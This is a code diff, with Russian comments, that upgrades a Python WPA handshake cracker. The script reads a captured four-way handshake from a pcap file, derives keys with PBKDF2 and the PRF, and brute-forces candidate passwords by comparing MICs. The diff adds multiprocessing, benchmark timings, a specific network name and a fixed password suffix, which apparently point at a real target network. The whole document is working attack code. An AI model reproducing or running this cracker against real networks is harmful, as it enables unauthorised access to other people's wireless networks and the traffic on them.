@@ -1,9 +1,25 @@
+# -*- coding: utf-8 -*-
+'''
+Алфавит : 'abcdef'
+Длина пароля: 5
+Результаты:
+    мой ноутбук[cpu_num]   -> 53s, 50s, 57s, 53s
+    мой ноутбук[cpu_num*2] -> 52s, 55s
+    --------------------
+    Kaggle CPU[cpu_num]    -> 9s, 9s
+    Kaggle CPU[cpu_num*2]  -> 9s, 9s
+
+'''
+
 from scapy.all import rdpcap, EAPOL, Dot11, Raw
 from binascii import hexlify, a2b_hex
-from pbkdf2 import PBKDF2
-from hashlib import sha1
+from hashlib import pbkdf2_hmac, sha1
 from hmac import new
 from itertools import product
+from functools import partial
+from time import time
+import os
+from multiprocessing import Pool
 
 
 def check(pkt, handshakes, bssid, cl):
@@ -76,18 +92,49 @@ def customPRF512(key, A, B):
     return R[:blen]
 
 
+def try_password(password, essid, key_data, payload, mic):
+    pwd = ''.join(password[1]) + 'xY3aOIq'
+    if password[0] % 200 == 0:
+        print(pwd)
+        print("-----")
+    pmk = pbkdf2_hmac('sha1', pwd.encode(), essid.encode(), 4096, 32)
+    ptk = customPRF512(pmk, b"Pairwise key expansion", key_data)
+    # _mic = hmac.new(_ptk[0:16], payload, md5).hexdigest()
+    _mic_ = new(ptk[0:16], payload, sha1).hexdigest()[:32]
+    _mic_ = _mic_.encode()
+    # if mic == mic or mic == _mic_
+    if mic == _mic_:
+        print('Пароль найден: ', pwd)
+        return pwd
+    return None
+
+
 def main():
-    # Открываем файл .cap и читаем его содержимое
+    cpu_num = os.cpu_count()
+    print('Число процессов: ', cpu_num)
     packets = rdpcap('shake.pcap')
     handshakes = [0, 0, 0, 0]
-    essid = 'essid'
+    essid = 'RT-WiFi-15C2'
     bssid = ''
     cl = ''
-    characters = 'abeghiw'
-    rep = 4
-    length = 4**len(characters)
 
-    passwords = product(characters, repeat=rep)
+    LATIN_LOWER = 'abcdefghijklmnopqrstuvwxyz'
+    LATIN_UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    NUMBERS = '0123456789'
+    CUSTOM = 'abcdef'
+
+    characters = CUSTOM
+    rep = 5
+    length = len(characters)**rep
+    print(f"Будет сгенирировано {length} слов.")
+
+    words = product(characters, repeat=rep)
+    passwords = []
+    for i, pwd in enumerate(words):
+        passwords.append((i, pwd))
+    print("Список паролей успешно обработан!")
+    passwords = tuple(passwords)
+    print(type(passwords))
 
     for pkt in packets:
         bssid, cl = check(pkt, handshakes, bssid, cl)
@@ -97,23 +144,24 @@ def main():
 
     key_data, mic, payload = organize(bssid, cl, handshakes)
 
-    for i, passwrd in enumerate(passwords):
-        password = ''.join(passwrd) + 'ending_of_pass'
-        if i % 30 == 0:
-            print(int(i / length * 100), '%')
-            print(password)
-            print("-----")
-        pmk = PBKDF2(password, essid, 4096).read(32)
-        ptk = customPRF512(pmk, b"Pairwise key expansion", key_data)
-        # _mic = hmac.new(_ptk[0:16], payload, md5).hexdigest()
-        _mic_ = new(ptk[0:16], payload, sha1).hexdigest()[:32]
+    loop_func = partial(try_password, essid=essid,
+                        key_data=key_data, payload=payload, mic=mic)
 
-        _mic_ = _mic_.encode()
-        # if mic == mic or mic == _mic_
-        if mic == _mic_:
-            print('Пароль найден: ', password)
-            print(i)
-            break
+    start = time()
+    pool = Pool(processes=cpu_num)
+    results = []
+    try:
+        for result in pool.imap_unordered(loop_func, passwords):
+            if result:
+                results.append(result)
+                pool.terminate()  # Прерывание выполнения пула процессов
+                break
+    finally:
+        pool.close()
+        pool.join()
+
+    end = time() - start
+    print(f"Это заняло {int(end)} секунд")
 
 
 if __name__ == "__main__":
